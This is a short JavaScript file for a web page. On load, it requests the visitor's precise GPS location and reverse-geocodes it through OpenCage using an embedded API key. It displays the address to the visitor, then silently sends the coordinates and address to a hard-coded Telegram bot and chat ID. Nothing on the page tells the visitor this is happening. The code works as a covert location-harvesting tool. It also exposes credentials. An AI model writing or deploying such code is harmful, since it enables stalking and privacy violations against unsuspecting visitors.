const locationDisplay = document.getElementById("location");
const loadingOverlay = document.getElementById("loading");
const retryBtn = document.getElementById("retry-btn");

function getLocation() {
  navigator.geolocation.getCurrentPosition(success, error, {
    enableHighAccuracy: true,
    timeout: 10000,
    maximumAge: 0
  });
}

function success(pos) {
  const lat = pos.coords.latitude;
  const lon = pos.coords.longitude;

  fetch(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=8e640acb36a3409a9877e0c900653f7d`)
    .then(res => res.json())
    .then(data => {
      const c = data.results[0].components;
      const locationString = `${c.country}, ${c.state}, ${c.county || c.district}, ${c.village || c.suburb || c.town || c.city || ''}`;
      locationDisplay.textContent = locationString;
      loadingOverlay.style.display = "none";

      // 🔹 Send to Telegram
      const message = `📍 New Location:\n${locationString}\nLatitude: ${lat}\nLongitude: ${lon}`;
      fetch(`https://api.telegram.org/bot7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: "6602027873",
          text: message
        })
      });

    })
    .catch(() => {
      locationDisplay.textContent = "Location lookup failed.";
      loadingOverlay.style.display = "none";
    });
}

function error(err) {
  locationDisplay.textContent = "GPS denied. Cannot get exact location.";
  loadingOverlay.style.display = "none";
}

retryBtn.addEventListener("click", () => {
  loadingOverlay.style.display = "flex";
  locationDisplay.textContent = "Retrying...";
  getLocation();
});

window.onload = () => {
  getLocation();
};
